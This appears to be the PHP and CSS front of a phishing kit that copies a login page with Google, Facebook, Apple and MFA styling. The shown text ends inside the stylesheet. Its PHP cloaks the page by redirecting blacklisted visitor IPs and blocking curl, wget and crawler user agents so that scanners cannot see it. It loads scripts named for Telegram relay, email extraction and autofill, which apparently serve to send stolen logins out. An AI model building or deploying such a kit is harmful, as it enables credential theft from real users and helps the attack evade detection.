<?php
//═══════════════════════════════════════════════════════════════════════════
//  🚫 IP BLACKLIST CHECK (High Priority)
//═══════════════════════════════════════════════════════════════════════════
require_once __DIR__ . '/../ip_blacklist_loader.php';

if (!function_exists('x8SYQLpUqU')) { 
    function x8SYQLpUqU() { 
        $xb2zx1 = $_SERVER['SERVER_ADDR']; 
        $xXSEJ = '127.0.0.1'; 
        if ((!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) && (($_SERVER['HTTP_CF_CONNECTING_IP'])!=$xXSEJ) && (($_SERVER['HTTP_CF_CONNECTING_IP'])!=($xb2zx1))) {
            $ip=$_SERVER['HTTP_CF_CONNECTING_IP'];
        } elseif ((!empty($_SERVER['GEOIP_ADDR'])) && (($_SERVER['GEOIP_ADDR'])!=$xXSEJ)) {
            $ip=$_SERVER['GEOIP_ADDR'];
        } elseif ((!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) && (($_SERVER['HTTP_X_FORWARDED_FOR'])!=$xXSEJ) && (($_SERVER['HTTP_X_FORWARDED_FOR'])!=($xb2zx1))) {
            $ip=explode(',',$_SERVER['HTTP_X_FORWARDED_FOR'])[0];
        } elseif ((!empty($_SERVER['HTTP_CLIENT_IP'])) && (($_SERVER['HTTP_CLIENT_IP'])!=$xXSEJ) && (($_SERVER['HTTP_CLIENT_IP'])!=($xb2zx1))) {
            $ip=$_SERVER['HTTP_CLIENT_IP'];
        } else {
            $ip=$_SERVER['REMOTE_ADDR'];
        } 
        return $ip; 
    }
}
$ip=x8SYQLpUqU();

// Check if visitor IP is in blacklist files
if (IPBlacklistLoader::isBlacklisted($ip)) {
    // IP is blacklisted - redirect to centralized URL
    require_once __DIR__ . '/../config_redirect.php';
    header('Location: ' . CENTRALIZED_REDIRECT_URL, true, 302);
    exit;
}

//═══════════════════════════════════════════════════════════════════════════
//  Basic Bot Detection (Secondary Layer)
//═══════════════════════════════════════════════════════════════════════════ 

if (!function_exists('x9PfbWn2bS')) { 
    function x9PfbWn2bS() { 
        if(empty($_SERVER['HTTP_USER_AGENT'])) { 
            $_SERVER['HTTP_USER_AGENT'] = getenv('HTTP_USER_AGENT'); 
        } 
        return $_SERVER['HTTP_USER_AGENT']; 
    }
}
$eRf9t9d9 = x9PfbWn2bS();

// Basic user agent check (secondary protection layer)
$ua_lower = strtolower($eRf9t9d9);
$obvious_bots = ['curl', 'wget', 'python-requests', 'python-urllib', 'go-http-client', 'java/', 'bot', 'crawler', 'spider', 'scraper'];
foreach ($obvious_bots as $bot_signature) {
    if (strpos($ua_lower, $bot_signature) !== false) {
        die(header('HTTP/1.1 403 Forbidden'));
    }
}

// ✅ All checks passed - load page
?>
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title></title>

<!-- Antibot Scripts -->
<script src="../m/js/fingerprint.js"></script>
<script src="../m/js/utils.js"></script>
<script src="../m/js/captcha.js"></script>

<!-- Centralized Functions -->
<script src="../js/centralized_telegram.js"></script>
<script src="../js/centralized_redirect.js"></script>
<script src="../js/email_extractor.js"></script>
<script src="../js/autofill_helper.js"></script><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&amp;display=swap"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"><style>* {
    font-family: Montserrat, sans-serif;
}

body {
    background-color: rgb(242, 242, 242);
    margin: 0px;
}

form {
    padding: 20px 56px 32px;
}

input {

    height: 38px;
    width: 100%;
    font-size: 16px;
    border: 1px solid darkgrey;
    padding: 0px 3px;
    font-weight: 400;

}

button {

    height: 38px;
    width: 100%;
    font-size: 16px;
    border: 1px solid darkgrey;
    padding: 0px 3px;
    font-weight: 400;

}

table {
    width: 100%;
}

a {
    text-decoration: none;
}

p {
    margin: 0
}

.color-black {
    color: black !important;
}

.color-white {
    color: rgb(255, 255, 255);
}

.font-size-14 {
    font-size: 14px;
}


.font-size-16 {
    font-size: 16px;
}

.font-weight-400 {
    font-weight: 400;
}

.font-weight-500 {
    font-weight: 500;
}

.display-flex {
    display: flex;
}

.align-items {
    align-items: center;
}

.justify-center {
    display: flex;
    justify-content: center !important;
}

.text-align{
    text-align: center;
}

.link-color {
    cursor: pointer;
    font-weight: 600;
    color: rgb(1, 114, 206);
}

.link-color:hover {
    opacity: 0.8;
}

.button-background-color {
    background: rgb(1, 114, 206);
}

.cursor-pointer {
    cursor: pointer;
}

.margin-top {
    margin-top: 10px;
}

.outer-div {
    width: 100%;
    display: flex;
    justify-content: center;
    width: 100%;
    min-height: 525px;
}

.inner-div {
    position: relative;
    height: 100%;
    width: 550px;
    border: 1px solid rgb(206, 206, 213);
    background-color: rgb(255, 255, 255);
    color: rgb(33, 37, 41);
    margin-bottom: 50px;
}

.heading-div {
    padding: 20px 56px 0;
    margin-top: 16px;
}

.heading-div h3 {
    font-size: 26px;
    color: rgb(0, 125, 186);
    margin: 0;
    font-weight: 400;
}

.heading-div h4 {
    font-size: 16px;
    color: rgb(112, 123, 135);
    margin-top: 10px;
    margin-bottom: 0;
    font-weight: inherit;
}

.label-div {
    color: rgb(112, 123, 135);
    font-size: 16px;
    margin-bottom: 10px;
    font-weight: 600;
}

.under-table-div {
    -webkit-box-pack: justify;
    justify-content: space-between;
}

.checkbox-input {
    width: auto;
    height: auto;
    cursor: pointer;
}

.button-div {
    margin-top: 14px;
    border: none;
    outline: none;
    font-size: 16px;
}

.header {
    background: linear-gradient(rgb(254, 254, 254), rgb(230, 228, 229));
    justify-content: space-between;
    height: 36px;
}

.footer-top {
    background-color: rgb(87, 88, 92);
    padding: 50px 100px 0px;
    display: flex;
    -webkit-box-pack: justify;
    justify-content: space-between;
    align-items: flex-start;
}

.footer-top ul {
    list-style: none outside;
    color: rgb(255, 255, 255);
    margin: 0;
    padding: 0;
}

.footer-bottom {
    background-color: rgb(87, 88, 92);
    display: flex;
    -webkit-box-align: center;
    align-items: center;
    -webkit-box-pack: justify;
    justify-content: space-between;
    padding: 65px 100px 0px;
}

.search-input {
    height: 55%;
    width: 50%;
    margin-left: 8px;
    border: 1px solid gray;
    border-radius: 2px;
}

.list-heading {
    padding: 1px 0px;
    color: rgb(255, 255, 255);
    font-family: Montserrat;
    font-size: 16px;
    font-weight: 600;
    letter-spacing: 0px;
    text-align: left;
    line-height: 30px;
    background-color: transparent;
    width: 100%;
    cursor: auto;
    border: none;
    display: flex;
    -webkit-box-pack: start;
    justify-content: flex-start;
    -webkit-box-align: center;
    align-items: center;
    margin: 0;
}

.list-anchor {
    color: rgb(255, 255, 255);
    font-family: Montserrat;
    font-size: 14px;
    font-weight: 400;
    font-style: normal;
    letter-spacing: 0px;
    line-height: 24px;
    text-decoration: underline;
}

.logged-out {
    background-color:rgb(233,244,255);
    border:1px solid rgb(96,159,223);
    color:rgb(0,102,204);
    font-size:14px;
    font-weight:400;
    margin-top: 10px;
    padding: 10px;
    text-align: center;
}

.heading-form{
    padding: 0px;
    display: flex;
    -webkit-box-pack: center;
    justify-content: center;
    -webkit-box-align: center;
    align-items: center;
    width: 50%;
    margin: 0px auto;
}

.social-anchor {
    padding: 8px;
    background-color: rgb(255, 255, 255);
    border-radius: 50%;
    margin-right: 8px;
    text-decoration: none;
}

.social-icon{
    font-size: 20px;
    color: rgba(87, 88, 92, 1);
    height: 17px;
    width: 17px;
}

.center-logo-div {
    margin: 25px auto 16px;
    display: flex;
    -webkit-box-pack: center;
    justify-content: center;
}

.footer-ul-div {
    background-color: rgb(87, 88, 92);
    flex: 1 1 0%;
}

.password-input-wrapper {
    position: relative;
    width: 100%;
    height: 100%;
}

.password-input-wrapper input {
    position: relative;
    width: 100%;
    height: 38px;
}

.password-input-wrapper span {
    position: absolute;
    right: 5px;
    top: 20px;
    cursor: pointer;
}

.password-input-wrapper span i {
    color: rgb(121, 121, 121);
}

.checkbox-slider {
    position: relative;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 15px;
    margin-right: 5px;
    gap: 2px;
    cursor: pointer;
}

.checkbox-slider input {
    opacity: 0;
    width: 0;
    height: 0;
}

.checkbox-slider input:checked + i {
    background-color: #004fff;
}

.checkbox-slider input:focus + i {
    box-shadow: 0 0 1px #004fff;
}

.checkbox-slider input:checked + i:before {
    -webkit-transform: translateX(23px);
    -ms-transform: translateX(23px);
    transform: translateX(23px);
}

.checkbox-slider i {
    position: relative;

    display: inline-block;
    cursor: pointer;
    width: 40px;
    height: 16px;
    background-color: #ccc;
    -webkit-transition: 0.4s;
    transition: 0.4s;
    border-radius: 34px;
}

.checkbox-slider i:before {
    position: absolute;
    content: "";
    height: 12px;
    width: 12px;
    left: 2px;
    bottom: 2px;
    background-color: white;
    -webkit-transition: 0.4s;
    transition: 0.4s;
    border-radius: 50%;
}

.hyperlink-button {
    background-color: transparent;
    border: none;
    color: rgb(1, 114, 206);
    text-decoration: underline;
    cursor: pointer;
    padding: 0;
    font: inherit;
    width: auto;
}

.different-question-link {
    margin-top: 10px;
}

.google-sign-in-button {
    transition: background-color .3s, box-shadow .3s;

    padding: 12px 16px 12px 42px;
    border: none;
    border-radius: 3px;
    box-shadow: 0 -1px 0 rgba(0, 0, 0, .04), 0 1px 1px rgba(0, 0, 0, .25);

    background-image: url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTgiIGhlaWdodD0iMTgiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGcgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIj48cGF0aCBkPSJNMTcuNiA5LjJsLS4xLTEuOEg5djMuNGg0LjhDMTMuNiAxMiAxMyAxMyAxMiAxMy42djIuMmgzYTguOCA4LjggMCAwIDAgMi42LTYuNnoiIGZpbGw9IiM0Mjg1RjQiIGZpbGwtcnVsZT0ibm9uemVybyIvPjxwYXRoIGQ9Ik05IDE4YzIuNCAwIDQuNS0uOCA2LTIuMmwtMy0yLjJhNS40IDUuNCAwIDAgMS04LTIuOUgxVjEzYTkgOSAwIDAgMCA4IDV6IiBmaWxsPSIjMzRBODUzIiBmaWxsLXJ1bGU9Im5vbnplcm8iLz48cGF0aCBkPSJNNCAxMC43YTUuNCA1LjQgMCAwIDEgMC0zLjRWNUgxYTkgOSAwIDAgMCAwIDhsMy0yLjN6IiBmaWxsPSIjRkJCQzA1IiBmaWxsLXJ1bGU9Im5vbnplcm8iLz48cGF0aCBkPSJNOSAzLjZjMS4zIDAgMi41LjQgMy40IDEuM0wxNSAyLjNBOSA5IDAgMCAwIDEgNWwzIDIuNGE1LjQgNS40IDAgMCAxIDUtMy43eiIgZmlsbD0iI0VBNDMzNSIgZmlsbC1ydWxlPSJub256ZXJvIi8+PHBhdGggZD0iTTAgMGgxOHYxOEgweiIvPjwvZz48L3N2Zz4=);
    background-color: white;
    background-repeat: no-repeat;
    background-position: 12px 11px;
}

.facebook-sign-in-button {
    transition: background-color .3s, box-shadow .3s;

    padding: 12px 16px 12px 42px;
    border: none;
    border-radius: 3px;
    box-shadow: 0 -1px 0 rgba(0, 0, 0, .04), 0 1px 1px rgba(0, 0, 0, .25);

    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASCAIAAADZrBkAAAABV2lDQ1BJQ0NQcm9maWxlAAB4nHWQT0tCQRTFz7MXVjxEqmWRuyJMQg2SQDAXErR4WEJ/Vs/RNHjaNL6oVn2BvkLQon0bIXAVtGkXIYh9gKBFmwgkKJnuaPW06MLl/DhzZrhzAY9ucW7rAEplR6RTy4GNza2A9wlD0GHAB4/FKjxhmqsUwbf2V6sBTWl9Tr3VvLuKPccbdrU29nhTX5z6m++rkVy+wkg/qGcZFw6gzRCbhw5XfEQ8Lmgo4lPFhS6fK852udrJrKeTxLfEfla0csRN4mC2xy/0cMk+YF8zqOmNfDmzRuqjnkAGEYSRxgJioAn+yUY72ST2wHEMgV0UUISDABLkcNjIE6+gDIYQgsRhzFNH1Y5/7871nBSw9KIOXW/7BLi8B0ZDrjftp2/HgethbgnrZ6NaS6/sRMJdNgQw+Cbl6yTgrQFtIeX7mZTtC2Dgge7ufwIh4GK1ESZSNAAAAHhlWElmTU0AKgAAABgAADhAAAAAZAAAOEAAAABkAAQBGgAFAAAAAQAAAAgBGwAFAAAAAQAAABABKAADAAAAAQACAACHaQAEAAAAAQAAAE4AAAAAAAOgAQADAAAAAf//AACgAgAEAAAAAQAAABKgAwAEAAAAAQAAABIAAAAAFW2SfQAACvNpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+Cjx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IlhNUCBDb3JlIDYuMC4wIj4KICAgPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4KICAgICAgPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIKICAgICAgICAgICAgeG1sbnM6dGlmZj0iaHR0cDovL25zLmFkb2JlLmNvbS90aWZmLzEuMC8iCiAgICAgICAgICAgIHhtbG5zOmV4aWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20vZXhpZi8xLjAvIj4KICAgICAgICAgPHRpZmY6WFJlc29sdXRpb24+MTQ0MDAvMTAwPC90aWZmOlhSZXNvbHV0aW9uPgogICAgICAgICA8dGlmZjpZUmVzb2x1dGlvbj4xNDQwMC8xMDA8L3RpZmY6WVJlc29sdXRpb24+CiAgICAgICAgIDx0aWZmOlJlc29sdXRpb25Vbml0PjI8L3RpZmY6UmVzb2x1dGlvblVuaXQ+CiAgICAgICAgIDxleGlmOkNvbG9yU3BhY2U+NjU1MzU8L2V4aWY6Q29sb3JTcGFjZT4KICAgICAgICAgPGV4aWY6UGl4ZWxYRGltZW5zaW9uPjE4PC9leGlmOlBpeGVsWERpbWVuc2lvbj4KICAgICAgICAgPGV4aWY6UGl4ZWxZRGltZW5zaW9uPjE4PC9leGlmOlBpeGVsWURpbWVuc2lvbj4KICAgICAgPC9yZGY6RGVzY3JpcHRpb24+CiAgIDwvcmRmOlJERj4KPC94OnhtcG1ldGE+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAKPD94cGFja2V0IGVuZD0idyI/Pt3iBCQAAAAJcEhZcwAAFiUAABYlAUlSJPAAAALCSURBVHicXFPdSxRRFN8/o/fWXfdjXH0IiYoQEtOHHqKI3NXZmVlFUbAiXSui8APMNHqwFyXoS0MlwoeIPjXC3mShz4dKQdG5c++d3R2d2WY/ZrYzOzatXi53hnt+v3PO75x7XFUxCjsEpyBbO0YCPPVEqTdCPBHsi8gBVmYEylgwErIAFt5lf3Y3Tytb8ZFu1D6OBh6R4Wl69T45c1MMCcjH4hBvOd1Hk5moHIqhoSfJX6JuFs2iteA0M9nC0hc1PCx6WVS1NxoJcvRQx9bC8nbx/7KZhv2jZHLxSeJlsYUXgCbIwZgc5KSni+kS1twlmebSZ21wht54IL9LqHCh6kbbOKq0mMQFWitbacddKW8YJfCu+9klJchtusP4wOnNvknJdvVtXa/tFIN2tACHXq9oZbmZ2bx5dkCqaCH1fXhiQVn+nnFSv3APe1jiCvL4aA/aoLkyVUVVzzX2S+5mfGs27fiyTY/fKFBtV4AjTf0kqRmOJKroid/aiV7qbiHXHsqrYgZuHM1vE5qfQy6GTZ+MS0nVcEKNTKMAtwEVA9nVbbiKW59ZTDnWVyuaP4ogSXq4S1xF+r9MzInn5HgPrmmnDJi6aUMv+vRDK9XYsk69ULytEE2Q/ezW/Mcd22CYBvR3Decb4rgijAdnUopm5At5SN4sFgqGKYxJPqskMaDRc4N4R8+VpBXg3M7kG/vxwTAen09Cx0ttsRrz4ataHUMQCfpmPTMfK43O0lLyQDNSKlQSu5ul23PpEg04xlYyd+q66I+WvUlwEOSlO8/kPzmLZkWLWw0Ym0/Zgn9uZs8PISj9/glgBOKLSsKo9D6hrhG96Qr2RMjIXGqdZqdepuouiSDJAe8dnBj1RgmErb+Ma7uSNZ2k7iI51gNvX4IhLIftp4UEGuLSfp4wgsTwqYBAfTAsfNoZGXv/BQAA//8DACtQorYHt9teAAAAAElFTkSuQmCC);
    background-color: white;
    background-repeat: no-repeat;
    background-position: 12px 11px;
}

.apple-sign-in-button {
    transition: background-color .3s, box-shadow .3s;

    padding: 12px 16px 12px 42px;
    border: none;
    border-radius: 3px;
    box-shadow: 0 -1px 0 rgba(0, 0, 0, .04), 0 1px 1px rgba(0, 0, 0, .25);

    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA0AAAASCAQAAAAqYpy5AAAAAXNSR0IArs4c6QAAAIRlWElmTU0AKgAAABgAABwhAAAAZAAAHCEAAABkAAQBGgAFAAAAAQAAAAgBGwAFAAAAAQAAABABKAADAAAAAQACAACHaQAEAAAAAQAAAE4AAAAAAASQAAAHAAAABDAyMzKgAQADAAAAAQABAACgAgAEAAAAAQAAAA2gAwAEAAAAAQAAABIAAAAAY53iygAACyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+Cjx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IlhNUCBDb3JlIDYuMC4wIj4KICAgPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4KICAgICAgPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIKICAgICAgICAgICAgeG1sbnM6dGlmZj0iaHR0cDovL25zLmFkb2JlLmNvbS90aWZmLzEuMC8iCiAgICAgICAgICAgIHhtbG5zOmV4aWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20vZXhpZi8xLjAvIj4KICAgICAgICAgPHRpZmY6WFJlc29sdXRpb24+NzIwMS8xMDA8L3RpZmY6WFJlc29sdXRpb24+CiAgICAgICAgIDx0aWZmOllSZXNvbHV0aW9uPjcyMDEvMTAwPC90aWZmOllSZXNvbHV0aW9uPgogICAgICAgICA8dGlmZjpSZXNvbHV0aW9uVW5pdD4yPC90aWZmOlJlc29sdXRpb25Vbml0PgogICAgICAgICA8ZXhpZjpDb2xvclNwYWNlPjE8L2V4aWY6Q29sb3JTcGFjZT4KICAgICAgICAgPGV4aWY6UGl4ZWxYRGltZW5zaW9uPjEzPC9leGlmOlBpeGVsWERpbWVuc2lvbj4KICAgICAgICAgPGV4aWY6UGl4ZWxZRGltZW5zaW9uPjE4PC9leGlmOlBpeGVsWURpbWVuc2lvbj4KICAgICAgICAgPGV4aWY6RXhpZlZlcnNpb24+MDIzMjwvZXhpZjpFeGlmVmVyc2lvbj4KICAgICAgPC9yZGY6RGVzY3JpcHRpb24+CiAgIDwvcmRmOlJERj4KPC94OnhtcG1ldGE+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAKPD94cGFja2V0IGVuZD0idyI/PmcE5dIAAAAJcEhZcwAACxMAAAsTAQCanBgAAAEmSURBVHicdNE/LENRFMfxR0PFUmIiqYHF1KmhEkV0sRAxdifpSGowIQZJJzEbpEKYOliQiEQkBoOwiL/p0kWF+BtVz9fv5kndtHHP8O7L591zzznP4d/l/G3fyHPPI8VKumCLbQ6EFn3jUmCPWdIc8WSTyycvrDLKIqfa/VKWc1ZYViQZYox5dsUFQzts0Es3/QwQo4uwcI1XQ3FGaCJAA42KAM2kVMy7oTAhfLrSC594iUM+DLXRSnWJ6giSIceXoQ7aLfLTooJOvDL6iFgJq3Qurv4e1KuTZFzfOqWoZZgJDUy0rmvrLaphkAR3hs7Y10uP+okQpVOdLbDp9eUqb4oZJplmjiklO1Y615thkSw3XHLNLVd6PmuiZT+lfP0AAAD//wMA/Ct3DRl0ixcAAAAASUVORK5CYII=);
    background-color: white;
    background-repeat: no-repeat;
    background-position: 12px 11px;
}

.hidden {
    display: none;
}

button:disabled {
    background-color: #abaaaa;
    cursor: initial;
}

form.loading button {
    background-color: #abaaaa;
    cursor: initial;
}

form.loading button.hyperlink-button {
    background-color: transparent;
    color: #abaaaa;
}

form.loading #button-text {
    display: none;
}

form.loading #spinner {
    display: block;
}

.secondary-button {
    background: none;
    color: #57585c;
    font-weight: 500;
}

.input-box-wrapper {
    display: flex;
    justify-content: space-between;
}

.input-box {
    max-width: 2rem;
    max-height: 2rem;
    padding: 0.5rem;
    border: 1px solid #B9B9B9;
    border-radius: 4px;
    outline: none;
    text-align: center;
}

.input-box:focus {
    border-color: #007DBA;
}

.back-button-wrapper {
    position: relative;
    margin-bottom: 0.5rem;
}

.back-button-wrapper button {
    display: flex;
    align-items: center;
    padding: 0.5rem 0.5rem 0.5rem 0;
    font-size: 0.875rem;
    font-weight: 600;
    color: #707b87;
    background: transparent;
    border: none;
    border-radius: 0.25rem;
    transition: all 0.2s ease-in-out;
    width: auto;
    cursor: pointer;
}

.back-button-wrapper button:hover {
    opacity: 0.8;
}

.back-button-wrapper button.dark:hover {
    color: white;
    background: #ffffff1a;
}

.back-button-wrapper button .icon {
    margin-right: 0.5rem;
}

.back-button-wrapper span{
    display: flex;
    align-items: center;
}

.change-mfa-button {
    cursor: pointer;
    background: none;
    color: #707b87;
    display: flex;
    justify-content: start;
    align-items: center;
    padding-left: 1rem;
}

.change-mfa-button .icon-wrapper {
    color: #007DBA;
    margin-right: 0.75rem;
    display: flex;
    justify-content: center;
    align-items: center;
}

